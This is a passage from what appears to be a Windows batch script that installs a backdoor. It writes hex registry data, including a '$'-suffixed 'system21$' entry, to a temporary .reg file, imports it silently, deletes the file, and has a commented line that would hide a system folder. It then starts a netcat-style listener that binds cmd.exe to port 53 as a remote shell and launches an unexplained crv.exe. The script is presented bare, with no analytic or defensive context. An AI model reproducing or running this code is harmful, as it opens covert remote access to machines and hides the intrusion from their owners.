echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg
echo "system21$"=hex:01,00,04,80,30,00,00,00,4c,00,00,00,00,00,00,00,14,00,00,00,02,\>>C:\WINDOWS\secure.reg
echo   00,1c,00,01,00,00,00,00,00,14,00,bf,01,13,00,01,01,00,00,00,00,00,01,00,00,\>>C:\WINDOWS\secure.reg
echo   00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,5c,50,9c,\>>C:\WINDOWS\secure.reg
echo   da,34,04,00,00,01,05,00,00,00,00,00,05,15,00,00,00,2b,71,61,d8,14,31,25,7e,\>>C:\WINDOWS\secure.reg
echo   5c,50,9c,da,01,02,00,00>>C:\WINDOWS\secure.reg>>C:\WINDOWS\secure.reg

regedit /s C:\WINDOWS\secure.reg
del C:\WINDOWS\secure.reg

:attrib /d +s +h +r C:\Documents and Settings\-SYSTEM-
runsvr -L -d -p 53 -t -e cmd.exe
call crv.exe
exit





